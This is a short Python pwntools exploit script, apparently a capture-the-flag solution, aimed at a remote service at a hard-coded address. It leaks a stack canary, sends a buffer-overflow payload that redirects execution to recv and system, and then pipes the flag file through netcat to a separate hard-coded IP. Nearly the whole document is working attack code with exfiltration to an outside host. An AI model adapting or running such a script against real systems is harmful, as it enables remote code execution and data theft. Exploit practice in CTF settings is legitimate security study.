#!/usr/bin/python
from pwn import *

IP = "110.10.212.130"
PORT = 8888

#IP = "127.0.0.1"
#PORT = 8181
MY_IP = "121.135.150.213"
RECV_PORT = 1234

p = remote(IP, PORT)
print p.recvuntil(" > ")
p.sendline("1")
print p.recvuntil(" : ")

#
payload = "a"*40 + "b"#first bytes of canary is \x00, so I send one more byte to remove \x00
p.send(payload)
print p.recv(40)
canary = p.recv(4)
print canary.encode("hex")
canary = canary.replace("b","\x00")
print canary.encode("hex")
print p32(u32(canary))
print p.recvuntil(" > ")


#
p.sendline("1")
print p.recvuntil(" : ")

recv_addr = 0x08048907 
str_addr = 0x0804b0a0#buffer for recv function
call_system = 0x08048C53
payload = "a"*40 + p32(u32(canary)) + "A"*12 + p32(recv_addr) + p32(call_system) +p32(str_addr) + p32(0x100)
p.send(payload)
print p.recvuntil(" > ")


#
p.sendline("3")#trigger!

p.sendline("cat flag | nc "+MY_IP+" "+str(RECV_PORT))
p.interactive()

p.close()
